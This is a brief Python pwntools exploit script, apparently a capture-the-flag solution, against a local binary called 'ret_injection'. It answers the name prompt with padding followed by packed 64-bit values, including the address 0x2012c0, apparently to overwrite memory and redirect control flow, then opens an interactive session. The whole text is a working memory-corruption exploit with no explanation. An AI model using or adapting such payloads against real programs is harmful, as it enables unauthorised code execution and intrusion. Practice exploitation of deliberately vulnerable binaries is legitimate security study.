from pwn import *
context.log_level = "debug"
r = process('./ret_injection')
vul_addr='a'*4+p64(0x41).decode("iso-8859-1")+p64(0x2012c0).decode("iso-8859-1")
r.recvuntil("plz input your name: \n")
r.sendline(vul_addr)
r.interactive()


